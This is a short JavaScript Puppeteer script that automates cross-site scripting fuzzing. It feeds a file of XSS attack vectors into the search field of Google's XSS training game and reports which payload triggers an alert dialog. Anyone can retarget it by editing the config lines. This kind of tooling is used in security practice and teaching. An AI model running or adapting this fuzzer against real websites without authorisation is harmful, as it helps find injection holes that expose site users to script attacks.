//Effing imports
const puppeteer = require('puppeteer');
const fs = require('fs');

//Config change it to urs
const targetURL= "https://xss-game.appspot.com/level1/frame";
const inputSelector = '#query'

console.log("______________________________________")
var lines =[]

//Handling Files
try {
    // read contents of the file
    const data = fs.readFileSync('<file with your xss attack vectors>', 'UTF-8');
    // split the contents by new line
     lines = data.split(/\r?\n/);  
} catch (err) {
    console.error(err);
}


//Attack Function
async function jeher()  {

    //Stupid initiation
    const browser = await puppeteer.launch({
        executablePath: 'path to your\\chrome.exe',
        headless: false 
    });
    const page = await browser.newPage();
    await page.goto(targetURL, { "waitUntil": "load" });

    //Handling Dialog and Ending the script (Assertion)
    page.on('dialog', async dialog => {
        console.log(dialog.message());
        console.log(dialog.accept());
        console.log("_____________________________________________________________\n"+"This is your Attack Vector"+"\n\t|\n\t|\n\t|\n\tV" )
        console.log(lines[i])
        console.log("\n\n_______________________________________________________")
        await page.close()
        await browser.close()
        });


    //Navigation 
    await page.waitForSelector(inputSelector);
    

    //attack
    for(var i = 0; i < lines.length;i++){
        await page.type(inputSelector,lines[i])
        await page.click("#button")
        await page.waitForSelector('#level1 > div > a' )
        await page.click('#level1 > div > a')
       
  }
}

jeher()
